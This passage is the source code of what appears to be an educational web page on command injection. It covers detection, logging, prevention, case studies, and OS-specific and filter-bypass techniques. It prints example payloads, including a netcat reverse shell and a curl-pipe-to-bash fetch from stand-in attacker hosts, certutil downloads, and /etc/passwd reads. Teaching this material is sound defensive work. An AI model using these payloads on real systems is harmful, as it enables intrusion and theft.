          <List dense>
            {detectionSignals.map((signal, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <WarningIcon sx={{ fontSize: 16, color: "#f59e0b" }} />
                </ListItemIcon>
                <ListItemText 
                  primary={signal} 
                  primaryTypographyProps={{ variant: "body2", fontWeight: 500 }}
                />
              </ListItem>
            ))}
          </List>

          {/* Detailed explanation */}
          <Box sx={{ mt: 3, pt: 2, borderTop: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
              📍 What Each Signal Means
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  <strong>Shell error messages:</strong> Messages like "bash: syntax error" or "sh: command not found" in response bodies or logs indicate that user input reached a shell. Even failed commands confirm the vulnerability exists.
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  <strong>Time delays:</strong> If normal requests take 200ms but a request with <code>; sleep 10</code> takes 10.2 seconds, that's a smoking gun. Monitor response times and alert on anomalies.
                </Typography>
              </Grid>
              <Grid item xs={12} md={6}>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  <strong>Outbound callbacks:</strong> Your server shouldn't be making random DNS queries or HTTP requests. Tools like Burp Collaborator or interactsh can catch these callbacks and prove data exfiltration.
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8 }}>
                  <strong>Child processes:</strong> If your web app only runs Apache and PHP, but suddenly there's a <code>/bin/bash</code> child process, something's wrong. Process monitoring catches these anomalies.
                </Typography>
              </Grid>
            </Grid>
          </Box>
        </Paper>

        {/* Logging and Monitoring */}
        <Paper
          id="logging"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#0ea5e9", 0.05),
            border: `1px solid ${alpha("#0ea5e9", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#0ea5e9" }} /> Logging and Monitoring Fields
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Good logging is like a security camera for your code.</strong> When a command injection attempt happens, proper logs let you understand what happened, who did it, and how to prevent it. Log enough to investigate, but be careful not to log sensitive data like passwords or API keys!
            </Typography>
          </Box>

          <List dense>
            {loggingFields.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#0ea5e9" }} />
                </ListItemIcon>
                <ListItemText 
                  primary={item} 
                  primaryTypographyProps={{ variant: "body2", fontWeight: 500 }}
                />
              </ListItem>
            ))}
          </List>

          {/* Code example */}
          <Box sx={{ mt: 3, p: 2, bgcolor: alpha("#000", 0.04), borderRadius: 2, fontFamily: "monospace", fontSize: "0.8rem" }}>
            <Typography variant="caption" sx={{ color: "#0ea5e9", fontWeight: 600 }}>Example Log Entry:</Typography><br/>
            <code>
              {`{`}<br/>
              {"  "}"timestamp": "2024-01-15T14:32:00Z",<br/>
              {"  "}"action": "ping_command",<br/>
              {"  "}"raw_input": "192.168.1.1; whoami",<br/>
              {"  "}"sanitized": "192.168.1.1",<br/>
              {"  "}"blocked": true,<br/>
              {"  "}"reason": "shell_metacharacter_detected",<br/>
              {"  "}"user_ip": "10.0.0.42",<br/>
              {"  "}"user_agent": "Mozilla/5.0..."<br/>
              {`}`}
            </code>
          </Box>
        </Paper>

        {/* Option Injection */}
        <Paper
          id="option-injection"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.05),
            border: `1px solid ${alpha("#8b5cf6", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#8b5cf6" }} /> Option Injection and Parsing
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>What if they block metacharacters but still use user input as arguments?</strong> Many commands accept flags (options starting with <code>-</code> or <code>--</code>) that change their behavior. Even without shell injection, an attacker can manipulate these flags.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              For example, <code>tar</code> has an option <code>--checkpoint-action=exec=CMD</code> that runs a command. If an attacker can control the filename being archived, they might inject this option. This is <strong>option injection</strong>—same danger, different technique.
            </Typography>
          </Box>

          <List dense>
            {optionInjectionTips.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#8b5cf6" }} />
                </ListItemIcon>
                <ListItemText 
                  primary={item} 
                  primaryTypographyProps={{ variant: "body2", fontWeight: 500 }}
                />
              </ListItem>
            ))}
          </List>

          {/* Code example */}
          <Box sx={{ mt: 3, p: 2, bgcolor: alpha("#000", 0.04), borderRadius: 2, fontFamily: "monospace", fontSize: "0.8rem" }}>
            <Typography variant="caption" sx={{ color: "#8b5cf6", fontWeight: 600 }}>The -- Defense:</Typography><br/>
            <code>
              # Without --: attacker filename "-rf /" becomes rm -rf /<br/>
              rm $user_filename  <span style={{ color: "#6b7280" }}># DANGEROUS!</span><br/><br/>
              # With --: filename treated as literal, not as options<br/>
              rm -- $user_filename  <span style={{ color: "#22c55e" }}># Safe: "-rf /" becomes a literal filename</span>
            </code>
          </Box>
        </Paper>

        {/* Vulnerable Patterns & Prevention */}
        <Typography id="vuln-prevention" variant="h5" sx={{ fontWeight: 700, mb: 2 }}>Vulnerable Patterns &amp; Prevention</Typography>
        
        {/* Beginner explanation */}
        <Paper sx={{ p: 3, mb: 3, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            🔍 Learning to Spot Vulnerable Code
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            The best way to understand command injection is recognizing patterns in code. In every vulnerable example, you'll see user input being <strong>concatenated into a command string</strong>. The fix is always to <strong>avoid shell interpretation</strong> or use <strong>strict allowlist validation</strong>.
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
            <strong>Red flags in code reviews:</strong> Search for these dangerous functions and patterns. If you find user input near any of these, investigate immediately.
          </Typography>
          <Box sx={{ mt: 2, fontFamily: "monospace", fontSize: "0.85rem" }}>
            <Chip label="Python: os.system(), subprocess(shell=True)" size="small" sx={{ mr: 1, mb: 1 }} />
            <Chip label="PHP: exec(), shell_exec(), system()" size="small" sx={{ mr: 1, mb: 1 }} />
            <Chip label="Node: child_process.exec()" size="small" sx={{ mr: 1, mb: 1 }} />
            <Chip label="Java: Runtime.exec(String)" size="small" sx={{ mr: 1, mb: 1 }} />
          </Box>
        </Paper>

        <Grid container spacing={3} sx={{ mb: 4 }}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#ef4444", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} /> Vulnerable Patterns
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2, color: "text.secondary" }}>
                These code patterns are <strong>dangerous</strong> because they allow user input to reach a shell interpreter without proper sanitization:
              </Typography>
              <List dense>
                {commonVulnPatterns.map((p, i) => (
                  <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <WarningIcon sx={{ fontSize: 16, color: "#ef4444" }} />
                    </ListItemIcon>
                    <ListItemText primary={p} primaryTypographyProps={{ variant: "body2", fontFamily: "monospace", fontSize: "0.8rem" }} />
                  </ListItem>
                ))}
              </List>
              <Box sx={{ mt: 2, p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2 }}>
                <Typography variant="caption" sx={{ fontWeight: 600, color: "#ef4444" }}>Why These Are Dangerous:</Typography>
                <Typography variant="body2" sx={{ mt: 1, lineHeight: 1.7 }}>
                  All of these pass user input through a shell. The shell interprets metacharacters like <code>;</code>, <code>|</code>, and <code>$(...)</code>, allowing attackers to append their own commands.
                </Typography>
              </Box>
            </Paper>
          </Grid>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, height: "100%", borderRadius: 3, bgcolor: alpha("#10b981", 0.03) }}>
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                <SecurityIcon sx={{ color: "#10b981" }} /> Prevention
              </Typography>
              <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2, color: "text.secondary" }}>
                These strategies protect against command injection. Use them together for <strong>defense in depth</strong>:
              </Typography>
              <List dense>
                {preventionMethods.map((m, i) => (
                  <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                    </ListItemIcon>
                    <ListItemText primary={m} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>
              <Box sx={{ mt: 2, p: 2, bgcolor: alpha("#10b981", 0.05), borderRadius: 2 }}>
                <Typography variant="caption" sx={{ fontWeight: 600, color: "#10b981" }}>The Golden Rule:</Typography>
                <Typography variant="body2" sx={{ mt: 1, lineHeight: 1.7 }}>
                  Never pass user input through a shell. Use libraries that bypass the shell (like subprocess with a list), or validate input against a strict allowlist before use.
                </Typography>
              </Box>
            </Paper>
          </Grid>
        </Grid>

        {/* Common Mistakes */}
        <Paper id="mistakes" sx={{ p: 3, mb: 4, borderRadius: 3, bgcolor: alpha("#ef4444", 0.04) }}>
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#ef4444" }} /> Common Sanitization Mistakes
          </Typography>
          
          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#fff", 0.5), p: 2, borderRadius: 2, mb: 3 }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Developers often think they've fixed command injection, but they haven't.</strong> These are the most common mistakes that leave applications vulnerable even after "sanitization." Learn to recognize these patterns so you don't make the same errors.
            </Typography>
          </Box>

          <List dense>
            {commonMistakes.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <WarningIcon sx={{ fontSize: 16, color: "#ef4444" }} />
                </ListItemIcon>
                <ListItemText 
                  primary={item} 
                  primaryTypographyProps={{ variant: "body2", fontWeight: 500 }}
                />
              </ListItem>
            ))}
          </List>

          {/* Detailed examples */}
          <Box sx={{ mt: 3, pt: 2, borderTop: `1px solid ${alpha("#ef4444", 0.2)}` }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 2, color: "#ef4444" }}>
              📍 Why Blocklists Fail
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
              Blocklisting <code>;</code> and <code>|</code>? Attackers use <code>&amp;&amp;</code>, newlines (<code>%0a</code>), or <code>$()</code> substitution. Block those too? They'll find encoding tricks, alternative shells, or option injection. <strong>You can never blocklist everything.</strong>
            </Typography>
            <Grid container spacing={2}>
              <Grid item xs={12} md={6}>
                <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2 }}>
                  <Typography variant="caption" sx={{ fontWeight: 600, color: "#ef4444" }}>❌ Blocklist Approach (Broken)</Typography>
                  <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", mt: 1 }}>
                    <code>if ";" not in user_input:</code><br/>
                    <code>{"  "}safe = True  # WRONG!</code>
                  </Box>
                </Box>
              </Grid>
              <Grid item xs={12} md={6}>
                <Box sx={{ p: 2, bgcolor: alpha("#10b981", 0.05), borderRadius: 2 }}>
                  <Typography variant="caption" sx={{ fontWeight: 600, color: "#10b981" }}>✓ Allowlist Approach (Correct)</Typography>
                  <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", mt: 1 }}>
                    <code>if re.match(r'^[0-9.]+$', user_input):</code><br/>
                    <code>{"  "}safe = True  # Only digits/dots</code>
                  </Box>
                </Box>
              </Grid>
            </Grid>
          </Box>
        </Paper>

        {/* Safe Command Construction Examples */}
        <Typography id="safe-commands" variant="h5" sx={{ fontWeight: 700, mb: 2 }}>Safe Command Construction</Typography>
        
        {/* Beginner explanation */}
        <Paper sx={{ p: 3, mb: 3, borderRadius: 3, bgcolor: alpha("#22c55e", 0.06), border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
          <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
            🛡️ Building Commands Safely
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
            The safest commands are ones that <strong>never see a shell</strong>. Modern programming languages provide ways to execute programs directly, passing arguments as separate items rather than a combined string. This prevents shell metacharacters from being interpreted.
          </Typography>
          <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
            Here's the key insight: when you use <code>subprocess.run(["ping", "-c", "4", ip])</code>, Python calls the ping program directly with 4 arguments. Even if <code>ip</code> contains <code>; rm -rf /</code>, it becomes a single malformed argument that ping rejects—not a separate command.
          </Typography>
        </Paper>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          {safeCommandExamples.map((example) => (
            <Grid item xs={12} md={6} key={example.title}>
              <Paper sx={{ p: 2.5, borderRadius: 2, border: `1px solid ${alpha("#3b82f6", 0.2)}` }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>
                  {example.title}
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.04), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem", mb: 1 }}>
                  {example.snippet}
                </Box>
                <Typography variant="caption" color="text.secondary">
                  {example.detail}
                </Typography>
              </Paper>
            </Grid>
          ))}
        </Grid>

        {/* Hardening Checklist */}
        <Paper
          id="hardening"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#10b981", 0.05),
            border: `1px solid ${alpha("#10b981", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#10b981" }} /> Hardening Checklist
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>A checklist for securing your application.</strong> Use this during code reviews, security audits, or when building new features that interact with the operating system. Each item adds a layer of protection—implement as many as possible.
            </Typography>
          </Box>

          <List dense>
            {hardeningChecklist.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#10b981" }} />
                </ListItemIcon>
                <ListItemText 
                  primary={item} 
                  primaryTypographyProps={{ variant: "body2", fontWeight: 500 }}
                />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Defense in Depth */}
        <Paper
          id="defense"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#3b82f6", 0.05),
            border: `1px solid ${alpha("#3b82f6", 0.2)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#3b82f6" }} /> Defense in Depth Layers
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Defense in depth means no single failure compromises your system.</strong> Think of it like a castle: you have walls, a moat, guards, locked doors, and a safe. An attacker might get past one layer, but they'd need to defeat ALL of them to reach the treasure.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              For command injection defense, this means: validate input, avoid shells, run with minimal privileges, monitor for anomalies, and containerize your application. If one layer fails, others still protect you.
            </Typography>
          </Box>

          <List dense>
            {defenseLayers.map((item, i) => (
              <ListItem key={i} sx={{ py: 0.5, px: 0 }}>
                <ListItemIcon sx={{ minWidth: 28 }}>
                  <CheckCircleIcon sx={{ fontSize: 16, color: "#3b82f6" }} />
                </ListItemIcon>
                <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
              </ListItem>
            ))}
          </List>
        </Paper>

        {/* Real-World Case Studies */}
        <Paper
          id="case-studies"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#ef4444", 0.03),
            border: `1px solid ${alpha("#ef4444", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <WarningIcon sx={{ color: "#ef4444" }} /> Real-World Case Studies
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Learning from history helps prevent future mistakes.</strong> These real-world vulnerabilities show how command injection affected major software and systems. Understanding these cases helps you recognize similar patterns in your own code.
            </Typography>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  Shellshock (CVE-2014-6271)
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  A Bash vulnerability where environment variables could contain shell commands. CGI scripts that used Bash were vulnerable because the web server passed HTTP headers as environment variables.
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  env x='() {"{ :;}"}; echo vulnerable' bash -c "echo test"
                </Box>
                <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 1 }}>
                  Impact: Millions of web servers compromised within hours of disclosure.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  ImageMagick "ImageTragick" (CVE-2016-3714)
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  ImageMagick's delegate feature passed user-controlled filenames to shell commands. Attackers crafted special image files that triggered command execution during processing.
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  push graphic-context<br/>
                  viewbox 0 0 1 1<br/>
                  fill 'url("|ls -la")'
                </Box>
                <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 1 }}>
                  Impact: Any site processing user uploads with ImageMagick was vulnerable.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  PHP Mail Function Attacks
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  PHP's mail() function passes the 5th parameter directly to sendmail without sanitization. Attackers inject additional sendmail parameters to write files or execute code.
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  <code>mail(to, subject, body, headers, INJECTION)</code>
                </Box>
                <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 1 }}>
                  Impact: Thousands of WordPress and CMS sites exploited through contact forms.
                </Typography>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                  Git Hooks via Clone URL
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  Malicious Git repository URLs containing special characters could execute commands on the client system when cloned, affecting Git clients and CI/CD systems.
                </Typography>
                <Box sx={{ p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  git clone 'ssh://-oProxyCommand=id/repo'
                </Box>
                <Typography variant="caption" color="text.secondary" sx={{ display: "block", mt: 1 }}>
                  Impact: Developer machines and build servers compromised via malicious repos.
                </Typography>
              </Box>
            </Grid>
          </Grid>
        </Paper>

        {/* Windows vs Linux */}
        <Paper
          id="os-differences"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#0ea5e9", 0.03),
            border: `1px solid ${alpha("#0ea5e9", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <CodeIcon sx={{ color: "#0ea5e9" }} /> Windows vs Linux Command Injection
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9 }}>
              <strong>Different operating systems use different shells and metacharacters.</strong> Windows uses cmd.exe or PowerShell, while Linux uses Bash or sh. Knowing the target OS helps you craft effective payloads for testing—and build defenses that work on both platforms.
            </Typography>
          </Box>

          <Grid container spacing={3}>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#0ea5e9", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                  🐧 Linux/Unix Shells
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  Linux typically uses <code>bash</code>, <code>sh</code>, or <code>zsh</code>. These share most metacharacter syntax:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", lineHeight: 2 }}>
                  <code>;</code> — Command separator<br/>
                  <code>|</code> — Pipe output<br/>
                  <code>&amp;&amp;</code> — Run if previous succeeds<br/>
                  <code>||</code> — Run if previous fails<br/>
                  <code>$(cmd)</code> — Command substitution<br/>
                  <code>`cmd`</code> — Legacy substitution<br/>
                  <code>&amp;</code> — Background execution<br/>
                  <code>${"${IFS}"}</code> — Whitespace bypass
                </Box>
                <Box sx={{ mt: 2, p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  <Typography variant="caption" sx={{ fontWeight: 600 }}>Example Payloads:</Typography><br/>
                  ; cat /etc/passwd<br/>
                  | nc attacker.com 4444 -e /bin/bash<br/>
                  $(curl http://evil.com/shell.sh|bash)
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#0ea5e9", 0.05), borderRadius: 2, height: "100%" }}>
                <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#0ea5e9", mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                  🪟 Windows Shells
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  Windows uses <code>cmd.exe</code> or <code>PowerShell</code>. Some metacharacters differ:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", lineHeight: 2 }}>
                  <code>&amp;</code> — Command separator (cmd)<br/>
                  <code>|</code> — Pipe output<br/>
                  <code>&amp;&amp;</code> — Run if previous succeeds<br/>
                  <code>||</code> — Run if previous fails<br/>
                  <code>%VAR%</code> — Environment variable<br/>
                  <code>;</code> — PowerShell separator<br/>
                  <code>^</code> — Escape character<br/>
                  <code>`</code> — PowerShell escape
                </Box>
                <Box sx={{ mt: 2, p: 1.5, bgcolor: alpha("#000", 0.05), borderRadius: 1, fontFamily: "monospace", fontSize: "0.75rem" }}>
                  <Typography variant="caption" sx={{ fontWeight: 600 }}>Example Payloads:</Typography><br/>
                  &amp; type C:\Windows\win.ini<br/>
                  | powershell -c "whoami"<br/>
                  &amp; certutil -urlcache -f http://evil/shell.exe
                </Box>
              </Box>
            </Grid>
          </Grid>

          {/* Cross-platform detection */}
          <Box sx={{ mt: 3, p: 2, bgcolor: alpha("#f59e0b", 0.08), borderRadius: 2, border: `1px solid ${alpha("#f59e0b", 0.2)}` }}>
            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f59e0b" }}>
              💡 Cross-Platform Detection Payloads
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 1 }}>
              These payloads work on both Windows and Linux, making them useful when you don't know the target OS:
            </Typography>
            <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1 }}>
              <code>; sleep 10 || timeout 10</code> — Time delay on both<br/>
              <code>| curl http://attacker.com || certutil -urlcache -f http://attacker.com</code> — HTTP callback
            </Box>
          </Box>
        </Paper>

        {/* Encoding and Bypass Techniques */}
        <Paper
          id="bypass-techniques"
          sx={{
            p: 3,
            mb: 4,
            borderRadius: 3,
            bgcolor: alpha("#8b5cf6", 0.03),
            border: `1px solid ${alpha("#8b5cf6", 0.15)}`,
          }}
        >
          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
            <SecurityIcon sx={{ color: "#8b5cf6" }} /> Encoding &amp; Bypass Techniques
          </Typography>

          {/* Beginner explanation */}
          <Box sx={{ bgcolor: alpha("#22c55e", 0.08), p: 2, borderRadius: 2, mb: 3, border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
            <Typography variant="body2" sx={{ lineHeight: 1.9, mb: 2 }}>
              <strong>Filters and WAFs aren't perfect.</strong> Developers often implement blocklists that check for specific characters like <code>;</code> or keywords like <code>cat</code>. Attackers evade these using encoding, alternative syntax, and creative payloads. Understanding bypasses helps you test defenses and build stronger ones.
            </Typography>
            <Typography variant="body2" sx={{ lineHeight: 1.9, fontWeight: 600, color: "#ef4444" }}>
              ⚠️ This is why blocklists fail—there are always bypass techniques. Use allowlists instead!
            </Typography>
          </Box>

          <Grid container spacing={2}>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  URL Encoding
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  Web applications decode URL-encoded characters before processing, so encoded payloads may bypass string matching:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1 }}>
                  <code>%3B</code> → ; (semicolon)<br/>
                  <code>%7C</code> → | (pipe)<br/>
                  <code>%26</code> → &amp; (ampersand)<br/>
                  <code>%0a</code> → newline<br/>
                  <code>%24%28%29</code> → $() (substitution)
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  Whitespace Alternatives
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  If spaces are blocked, shells accept alternatives:
                </Typography>
                <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 1.5, borderRadius: 1 }}>
                  <code>cat&lt;/etc/passwd</code> — Input redirection<br/>
                  <code>cat${"${IFS}"}/etc/passwd</code> — IFS variable<br/>
                  <code>{"cat$'\\x20'/etc/passwd"}</code> — Hex space<br/>
                  <code>{"{cat,/etc/passwd}"}</code> — Brace expansion<br/>
                  <code>cat%09/etc/passwd</code> — Tab character
                </Box>
              </Box>
            </Grid>
            <Grid item xs={12} md={6}>
              <Box sx={{ p: 2, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 1 }}>
                  Command Obfuscation
                </Typography>
                <Typography variant="body2" sx={{ lineHeight: 1.8, mb: 2 }}>
                  If keywords like <code>cat</code> or <code>whoami</code> are blocked:
